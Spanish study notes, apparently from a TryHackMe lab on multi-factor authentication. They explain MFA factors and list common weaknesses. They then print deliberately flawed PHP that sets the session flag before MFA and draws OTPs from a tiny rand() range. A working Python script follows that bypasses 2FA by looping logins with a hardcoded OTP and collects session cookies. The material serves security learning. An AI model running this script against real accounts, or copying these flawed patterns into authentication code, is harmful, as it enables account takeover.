# Multi Factor Authentificator

# Objetivos

- Entender las principales operaciones de MFA y fortalecer aplicaciones en posturas de seguridad
- Explotar diferentes tipos de factores de autentificación MFA
- Ganar en escenarios prácticos conocimiento dE MFA e implementar protecciones de datos sensibles y sistemas

# Como funciona MFA

MFA añade un extra de procección a las cuentas requiriendo que haya dos o mas factores de verificación. Haciendo que el acceso sea un reto para los actores maliciosos.

Es importantes que las 2FA este bajo MFA.

## Tipos de Factores de Autentificación

MFA normalmente ocmbina dos o mas tipos de credenciales de categorias: Algo que sabes, algo que tienes, algo que eres, donde estas y algo que haces

![image](https://github.com/user-attachments/assets/fdee5651-e225-49fb-9ba9-dc3f761ef8b3)

## Tipos de 2FA

2FA utiliza varios mecanimos para asegurarse que la autentificacón es robusta en capas.

- Temporalidad de contaseñas que cambian een 30 segundos como Google Autentificator o Microsoft Authentificator.
- Aplicaciones como Google PRompt que mandan consultas de login a tu movil. Dando acceso o no directamnete al dispositivo
- Vía SMS
- Via Hardware

## Accesos condicionales

Se usa normalmente en compañias que ajustan los requerimientos de autentificacion basado en diferentes contextos.

- Basado en donde estas (localizacion)
Basado en horas regulares que te metes
Basado en cambios o acceso a datos que normalmente no usas
Dipositivo en especifico

# Implementaciones y aplicaciones

- MFA en bancos
- MFA en hospitales
- MFA en IT

# Vulnerabilidades comunes

## Algoritmos fragiles

Un algoritmo robusto, que no sea predecible, random seeds, etc.

## Aplicaciones lekeadas al token de 2FA

Endpoints inseguros en APIs, tokens, etc.

Codigo inseguro, respuestas

## Fuerza bruta al OTP

## Usar Evilginx

![image](https://github.com/user-attachments/assets/9ab03ca4-e702-4c55-a61f-92ca8d46d2d8)

# Práctica

![image](https://github.com/user-attachments/assets/40790416-e211-486f-bb37-75b8f08b9c8a)

![image](https://github.com/user-attachments/assets/b2c8aa78-3f2d-438b-a310-1c528c110797)

![image](https://github.com/user-attachments/assets/4d5431f6-0eec-4915-b8bc-0c5fd3f1c767)

![image](https://github.com/user-attachments/assets/06368c28-c1b6-4d1f-9bf7-60e8924b442f)

# Práctica - Codigo inseguro

![image](https://github.com/user-attachments/assets/19d4a1fa-a158-4f20-8d80-db4ddaa14a25)

![image](https://github.com/user-attachments/assets/21f6b901-2937-4fa8-8e5e-19077daaa004)

```
http://mfa.thm/labs/second/dashboard
```

Código:

```
# Function that verifies the submitted 2FA token
function verify_2fa_code($code) {
    if (!isset($_SESSION['token']))
    return false;

    return $code === $_SESSION['token'];
}

# Function called in the /mfa page
if (verify_2fa_code($_POST['code'])) { #If successful, the user will be redirected to the dashboard.
    $_SESSION['authenticated'] = true; # Session that is used to check if the user completed the 2FA
    header('Location: ' . ROOT_DIR . '/dashboard');
    return;
}
```

```
function authenticate($email, $password){
  $pdo = get_db_connection();
  $stmt = $pdo->prepare("SELECT `password` FROM users WHERE email = :email");
  $stmt->execute(['email' => $email]);
  $user = $stmt->fetch(PDO::FETCH_ASSOC);

  return $user && password_verify($password, $user['password']);
}

if (authenticate($email, $password)) {
    $_SESSION['authenticated'] = true; # This flag should only be issued after the MFA completion
    $_SESSION['email'] = $_POST['email'];
    header('Location: ' . ROOT_DIR . '/mfa');
    return;
}
```

# Auto Login

```
function generateToken()
{
    $token = strval(rand(1250, 1350));

    $_SESSION['token'] = $token;
    return 'success';
}
```

# Exploit

```
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
```





